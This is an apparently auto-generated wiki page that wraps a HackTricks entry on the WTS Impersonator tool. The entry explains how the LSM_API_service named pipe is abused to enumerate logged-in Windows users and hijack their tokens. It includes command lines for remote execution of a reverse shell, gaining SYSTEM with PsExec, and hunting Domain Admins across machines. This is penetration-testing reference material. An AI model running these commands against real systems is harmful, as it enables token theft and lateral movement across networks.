---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# WTS Impersonator

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-windows-hardening-stealing-credentials-wts-impersonator` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/windows-hardening/stealing-credentials/wts-impersonator.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [WTS Impersonator](../../topics/windows-hardening/wts-impersonator.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-windows-hardening-stealing-credentials-wts-impersonator |
| name | WTS Impersonator |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/windows-hardening/stealing-credentials/wts-impersonator.md |

## Preserved Source Material

````yaml
_body: "# WTS Impersonator\n\n{{#include ../../banners/hacktricks-training.md}}\n\nThe **WTS Impersonator** tool exploits\
  \ the **\"\\\\pipe\\LSM_API_service\"** RPC Named pipe to stealthily enumerate logged-in users and hijack their tokens,\
  \ bypassing traditional Token Impersonation techniques. This approach facilitates seamless lateral movements within networks.\
  \ The innovation behind this technique is credited to **Omri Baso, whose work is accessible on [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.\n\
  \n### Core Functionality\n\nThe tool operates through a sequence of API calls:\n\n```bash\nWTSEnumerateSessionsA → WTSQuerySessionInformationA\
  \ → WTSQueryUserToken → CreateProcessAsUserW\n```\n\n### Key Modules and Usage\n\n- **Enumerating Users**: Local and remote\
  \ user enumeration is possible with the tool, using commands for either scenario:\n\n  - Locally:\n    ```bash\n    .\\\
  WTSImpersonator.exe -m enum\n    ```\n  - Remotely, by specifying an IP address or hostname:\n    ```bash\n    .\\WTSImpersonator.exe\
  \ -m enum -s 192.168.40.131\n    ```\n\n- **Executing Commands**: The `exec` and `exec-remote` modules require a **Service**\
  \ context to function. Local execution simply needs the WTSImpersonator executable and a command:\n\n  - Example for local\
  \ command execution:\n    ```bash\n    .\\WTSImpersonator.exe -m exec -s 3 -c C:\\Windows\\System32\\cmd.exe\n    ```\n\
  \  - PsExec64.exe can be used to gain a service context:\n    ```bash\n    .\\PsExec64.exe -accepteula -s cmd.exe\n    ```\n\
  \n- **Remote Command Execution**: Involves creating and installing a service remotely similar to PsExec.exe, allowing execution\
  \ with appropriate permissions.\n\n  - Example of remote execution:\n    ```bash\n    .\\WTSImpersonator.exe -m exec-remote\
  \ -s 192.168.40.129 -c .\\SimpleReverseShellExample.exe -sp .\\WTSService.exe -id 2\n    ```\n\n- **User Hunting Module**:\
  \ Targets specific users across multiple machines, executing code under their credentials. This is especially useful for\
  \ targeting Domain Admins with local admin rights on several systems.\n  - Usage example:\n    ```bash\n    .\\WTSImpersonator.exe\
  \ -m user-hunter -uh DOMAIN/USER -ipl .\\IPsList.txt -c .\\ExeToExecute.exe -sp .\\WTServiceBinary.exe\n    ```\n\n{{#include\
  \ ../../banners/hacktricks-training.md}}"
_relative_path: windows-hardening/stealing-credentials/wts-impersonator.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/windows-hardening/stealing-credentials/wts-impersonator.md
````
